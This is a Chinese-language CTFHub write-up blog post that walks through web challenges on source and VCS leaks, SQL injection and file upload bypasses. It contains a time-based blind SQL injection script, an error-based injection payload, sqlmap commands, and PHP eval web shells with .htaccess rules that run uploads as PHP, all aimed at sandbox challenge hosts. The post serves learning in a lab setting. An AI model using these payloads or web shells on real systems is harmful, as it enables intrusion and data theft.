@@ -1,0 +1,1269 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="ctfhub personal writeup, ruokeqx">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>ctfhub personal writeup | ruokeqx</title>
+    <link rel="icon" type="image/jpeg" href="/medias/logo.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">ruokeqx</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>分类</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>标签</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ruokeqx</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-archive"></i>
+			
+			归档
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>分类</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>标签</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/ctfhub.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">ctfhub personal writeup</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-03-25
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><h4 id="目录历遍"><a href="#目录历遍" class="headerlink" title="目录历遍"></a>目录历遍</h4><p>直接找就行。。。</p>
+<h4 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h4><p>进去直接 ctrl+f 搜flag就行。。。</p>
+<h4 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h4><h5 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h5><p>提示一些相关的名字</p>
+<p>可以写个简单的脚本爆破一下 当然也可以 dirsearch 直接扫<br><img src="https://img-blog.csdnimg.cn/20200318234826623.png"></p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://challenge-c93f188d4781b829.sandbox.ctfhub.com:10080/"</span>
+a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'web'</span><span class="token punctuation">,</span><span class="token string">'website'</span><span class="token punctuation">,</span><span class="token string">'backup'</span><span class="token punctuation">,</span><span class="token string">'back'</span><span class="token punctuation">,</span><span class="token string">'www'</span><span class="token punctuation">,</span><span class="token string">'wwwroot'</span><span class="token punctuation">,</span><span class="token string">'temp'</span><span class="token punctuation">]</span>
+b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tar'</span><span class="token punctuation">,</span><span class="token string">'tar.gz'</span><span class="token punctuation">,</span><span class="token string">'zip'</span><span class="token punctuation">,</span><span class="token string">'rar'</span><span class="token punctuation">]</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> b<span class="token punctuation">:</span>
+        pos <span class="token operator">=</span> url <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> j
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>pos<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>获得源码解压后有个 flag.txt 但是里面不是flag 还有个奇怪的 50x.html 尝试直接访问这个奇怪的 html 没用 直接访问这个 flag.txt 就出了<br><img src="https://img-blog.csdnimg.cn/20200318235302511.png"></p>
+<h5 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h5><p>看到题目就下意识 备份文件后缀是 .bak （linux命名的习惯）</p>
+<p>打开网页 提示flag在 flag.php 里 加上后缀 down 下文件 flag就在里面<br><img src="https://img-blog.csdnimg.cn/20200318235707704.png"></p>
+<h5 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h5><p>又是考常识吧 linux下vim的缓存文件后缀是 .tmp 而且是隐藏文件 有个 . 的前缀</p>
+<p>把下下来的文件放 linux 读缓存就行了<br><img src="https://img-blog.csdnimg.cn/20200319000807193.png"></p>
+<h5 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h5><p>.DS_Store 是macos系统下的包含文件目录的文件</p>
+<p>下载文件并用脚本分析 然后到靶机打开这个目录就行<br><img src="https://img-blog.csdnimg.cn/2020031900142879.png"></p>
+<h4 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h4><p>真的不知道为什么 不管是 win 还是 linux 都没反应  重装了也不行<br><img src="https://img-blog.csdnimg.cn/20200319003022153.png"></p>
+<p>Githack 不能用的问题解决了 是脚本的问题 这里感谢一下评论区的师傅</p>
+<p>亲测可用的 Githack链接： <a target="_blank" rel="noopener" href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
+<h5 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h5><p>相对简单的一题 知识点：</p>
+<ul>
+<li>git log可以查看日志 就是看看历史版本中都干了些什么</li>
+<li>git reset –hard 版本号    就可以回到指定的版本 <pre><code>git reset --hard xxxxxxxxxxxxxxx</code></pre>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/2020032022320263.png"></p>
+<h5 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h5><p>做这题之前 需要知道 stash 是什么东西</p>
+<blockquote>
+<p>git stash是git一个很有用的命令，它的作用是把当前未提交的修改暂存起来，让仓库还原到最后一次提交的状态。常用于更新、同步代码或者保存多个修改版本等情况下。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/49ad8bceacac6b5834d8fa9a.html">个人感觉这篇百度经验写的精简明了</a></p>
+<pre><code>git stash    # git stash命令会将仓库中的修改保存，建立一条stash信息，默认的说明信息是最后一次提交的节点号和提交说明。
+git stash save #‘说明信息’与1的效果一样，说明信息是指定的内容，更加利于了解stash的内容。
+git stash list #列出当前仓库下所有的stash条目，每一条stash用stash@&#123;n&#125;标识。
+git stash pop [stash] # 将stash的内容弹出，默认弹出最上面的那条，即stash@&#123;0&#125;。此外还可以在pop后加stash@&#123;n&#125;来指定要弹出的stash条目。
+git stash drop [stash] #丢弃stash条目，默认丢弃最上面的那条，即stash@&#123;0&#125;，此外还可以在drop后加stash@&#123;n&#125;来指定要丢弃的stash条目。
+git stash clear #清除所有的stash条目。
+git show stash@&#123;n&#125;    #当有多条记录并且过了一段时间忘记stash内容时通过该命令可以查看stash的具体内容</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20200320225719791.png"></p>
+<h5 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h5><p>??? 这题简单地离谱。。。flag就在当前目录下 。。。我还以为是假的呢   那么为啥他是第三题。。。。<br><img src="https://img-blog.csdnimg.cn/20200320230011394.png"></p>
+<h4 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h4><p>使用 dvcs-ripper 工具中的 rip-svn.pl 脚本<br><img src="https://img-blog.csdnimg.cn/20200319012509569.png"><br>脚本使用过程可能会遇到下面类似的很长的报错</p>
+<blockquote>
+<p>install_driver(SQLite) failed: Can’t locate DBD/SQLite.pm</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45485719/article/details/104958542">解决方法 强烈建议开靶机前解决这个问题 不然很可能需要多花金币续费靶机</a></p>
+<h4 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h4><p>还是上一个脚本库里的 rip-hg.pl </p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#一定要加 -v 不然 down 不下来的</span>
+./rip-hg.pl -v -u http://challenge-365f72206c2c35b5.sandbox.ctfhub.com:10080/.hg/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>然后就是文件夹里一顿疯找 但是什么都找不到 但是很多个文件 里面都有关于 flag.txt 的<br><img src="https://img-blog.csdnimg.cn/20200319014447320.png"><br>看到这个就很清楚了 直接访问这个 flag.txt<br><img src="https://img-blog.csdnimg.cn/20200319014027196.png"></p>
+<h3 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h3><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p>第一次开靶机真的没有爆出来 真的郁闷 密码是随机的</p>
+<h4 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h4><p>没有用户名会提醒没有用户名 筛选用户名 选择对应口令就可以<br><img src="https://img-blog.csdnimg.cn/20200319132520417.png" alt="图片来自互联网"></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="SQL-整数型注入"><a href="#SQL-整数型注入" class="headerlink" title="SQL 整数型注入"></a>SQL 整数型注入</h4><p>id从3开始就没有回显 可以在3以后的数注</p>
+<p><img src="https://img-blog.csdnimg.cn/20200319133652968.png"></p>
+<p>注得数据库结构如下</p>
+<ul>
+<li>sqli<ul>
+<li>news<ul>
+<li>id            //1,2,114514</li>
+<li>data            //ctfhub,skill,sqli</li>
+</ul>
+</li>
+<li>flag<ul>
+<li>flag</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="SQL字符型注入"><a href="#SQL字符型注入" class="headerlink" title="SQL字符型注入"></a>SQL字符型注入</h4><p>数据库还是跟上一题一样 就是搜索方式 从数字变成字符 闭合一下前面的引号就可以了 本题不再赘述<br>理论上来说你可以直接注 flag 表里的 flag 字段(我就是这么做的 太懒了)<br><img src="https://img-blog.csdnimg.cn/20200319134858129.png"></p>
+<h4 id="SQL报错注入"><a href="#SQL报错注入" class="headerlink" title="SQL报错注入"></a>SQL报错注入</h4><p>updatexml 最长显示32位数 这题不能用<br><img src="https://img-blog.csdnimg.cn/20200319142427406.png"><br>使用</p>
+<pre class="line-numbers language-bash"><code class="language-bash">1 Union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x26,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x from information_schema.columns group by x<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9721693.html">学习的话可以参考这个</a><br>靶机续费了两次 亏死了 下面这个图里跑出来的flag是错的 QWQ 最后开第二遍跑出来了<br><img src="https://img-blog.csdnimg.cn/20200324231225387.png"><br>先手测一下 数据库 按出题人尿性都是 sqli 然后 匹配一下 s 看看 再匹配 a 对比一下<br><img src="https://img-blog.csdnimg.cn/20200324231959268.png"><br>用我蹩脚的python(我靶机续费两次的原因之一,,,,,,,QWQ) 写波脚本跑一下<br><img src="https://img-blog.csdnimg.cn/20200324224810999.png"><br>然后完善脚本把 数据表 字段和flag都跑出来 脚本如下 </p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#写脚本水平很低 大神不要喷哈</span>
+<span class="token comment" spellcheck="true">#使用的话只要稍微改几个参数就行了</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+url <span class="token operator">=</span> <span class="token string">"http://challenge-9514b2cf659c25a1.sandbox.ctfhub.com:10080/?id="</span>
+des <span class="token operator">=</span> <span class="token string">""</span>
+
+<span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz&amp;#125;&amp;#123;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="token punctuation">:</span>
+            <span class="token comment" spellcheck="true"># 数据库</span>
+            <span class="token comment" spellcheck="true"># sql = "if(substr(database(),%d,1)='%s',sleep(1),1) #" %(i,j)</span>
+            <span class="token comment" spellcheck="true"># 数据表</span>
+            <span class="token comment" spellcheck="true"># sql = "if(substr((select table_name from information_schema.tables where table_schema='sqli' limit %d,1),%d,1) = '%s',sleep(1),1)" %(k,i,j)</span>
+            <span class="token comment" spellcheck="true"># 字段</span>
+            <span class="token comment" spellcheck="true"># sql = "if(substr((select column_name from information_schema.columns where table_name='flag' and table_schema='sqli'),%d,1) = '%s',sleep(1),1)" %(i,j)</span>
+            <span class="token comment" spellcheck="true"># 字段内容</span>
+            sql <span class="token operator">=</span> <span class="token string">"if(substr((select flag from sqli.flag),%d,1) = '%s',sleep(1),1)"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
+            t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>sql<span class="token punctuation">)</span>
+            t2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>t2<span class="token operator">-</span>t1 <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                des <span class="token operator">+=</span> j
+                <span class="token keyword">print</span><span class="token punctuation">(</span>des<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"des:"</span> <span class="token operator">+</span> des<span class="token punctuation">)</span>
+    des <span class="token operator">=</span> <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h4><p>就是普通手注就行…….为啥它放这么下面…….不想写了<br><img src="https://img-blog.csdnimg.cn/20200324233941615.png"><br>算了 sqlmap 跑一波吧 这么多题还没跑过 sqlmap 呢 结果 sqlmap 跑还没手注快…..真实……<br><img src="https://img-blog.csdnimg.cn/20200325000130384.png"></p>
+<h4 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h4><p>抓包cookie后面 id后有一串东西像url编码 但是解出来乱码 直接改 id=1 试试<br><img src="https://img-blog.csdnimg.cn/20200324210318235.png"><br>手注发现有两处回显 无任何绕过<br><img src="https://img-blog.csdnimg.cn/20200324211519988.png"><br>注得数据库结构</p>
+<ul>
+<li>sqli<ul>
+<li>news<ul>
+<li>id<ul>
+<li>1,2,114514</li>
+</ul>
+</li>
+<li>data<ul>
+<li>ctfhub,skill,sqli</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>nooslnmxuf<ul>
+<li>vuhgcinlvb<ul>
+<li>ctfhub{8283144bd2b701f08311ac069af61fabdf227936}\</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>sqlmap也能跑出来</p>
+<blockquote>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-192a33ee430cafd7.sandbox.ctfhub.com:10080/&quot;">http://challenge-192a33ee430cafd7.sandbox.ctfhub.com:10080/&quot;</a> –cookie “id=1”  –dbs</p>
+</blockquote>
+<h4 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/w10234/p/5522280.html">UA注入介绍</a></p>
+<p>依然手注 依然无任何绕过 依然两个回显<br><img src="https://img-blog.csdnimg.cn/2020032421582664.png"><br>注得数据库结构</p>
+<ul>
+<li>sqli<ul>
+<li>news<ul>
+<li>id<ul>
+<li>1,2,114514</li>
+</ul>
+</li>
+<li>data<ul>
+<li>ctfhub,skill,sqli</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>rnarxnqskp<ul>
+<li>ahlzriucqp<ul>
+<li>ctfhub{df17b7f5fff86cb0176e077e0231c5ce567fb3ac}</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h4><p>我觉得还是一模一样的套路 不想写了…….唯一要注意的就是refer头要自己加</p>
+<blockquote>
+<p>ipploqowdc<br>ozknttspso<br>ctfhub{5cca896d0b05a1eb8977197827b33b57df87aacb}</p>
+</blockquote>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h4><p>传个马上去<br><img src="https://img-blog.csdnimg.cn/2020031917422214.png"></p>
+<p>蚁剑连上去<br><img src="https://img-blog.csdnimg.cn/20200319174342646.png"></p>
+<p>找到flag<br><img src="https://img-blog.csdnimg.cn/20200319174448162.png"></p>
+<h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p>php改名字前端上传 抓包改回php 一样的操作连蚁剑 取flag<br><img src="https://img-blog.csdnimg.cn/20200319181243794.png"></p>
+<h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><blockquote>
+<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+</blockquote>
+<p>简单来说就是操控服务器让他允许你做事</p>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/htaccess/1645473?fr=aladdin">百度百科链接</a></p>
+<p>.htaccess 利用方法 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c674904a711e">参考博文</a></p>
+<p>法一</p>
+<pre><code># FileMatch 参数即为文件名的正则匹配
+&lt;FilesMatch &quot;sniperoj&quot;&gt;
+  SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>法二</p>
+<pre><code>AddType application/x-httpd-php .jpg</code></pre>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ma'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>写个 .htaccess 文件 写个 马 后缀改 jpg(你允许的后缀) 然后上传蚁剑连一下就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/202003202209311.png"></p>
+<h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><blockquote>
+<p>MIME:客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p>
+</blockquote>
+<p>简单来说就是从 http 报文判断一下你上传的文件的类型</p>
+<p><img src="https://img-blog.csdnimg.cn/20200320231322296.png"></p>
+<p>写个马 Content-Type 字段中的值改成 image/gif 就行了 然后连蚁剑拿flag</p>
+<h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>画图软件随便弄个图 抓包最后加上马 然后改名 php 蚁剑连上就行<br><img src="https://img-blog.csdnimg.cn/20200319182546883.png"></p>
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><ul>
+<li>00截断原理</li>
+</ul>
+<p>  0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。</p>
+<ul>
+<li>00截断的限制条件</li>
+</ul>
+<pre><code>PHP&lt;5.3.29，且GPC关闭</code></pre>
+<p>传个普通的 temp.php 马上去抓包</p>
+<p>修改的地方可以有两个 1.上面地址 2.下面文件名 这里建议改上面的 <a target="_blank" rel="noopener" href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html">原因</a> </p>
+<p>我下面文件 temp.php 改成 temp.jpg 不然没法上传</p>
+<p><img src="https://img-blog.csdnimg.cn/20200320233821106.png"></p>
+<p>上面的地址改的是 ma.php 所以连的时候连 ma.php </p>
+<p><img src="https://img-blog.csdnimg.cn/20200320233932289.png"></p>
+<p>这样更容易理解吧</p>
+<h4 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h4><p>这就不用多讲了吧 题目都告诉你怎么做了 双写后缀就行  不过这个命名稍微有点讲究 稍微注意下就行</p>
+<p><img src="https://img-blog.csdnimg.cn/20200320234852633.png"></p>
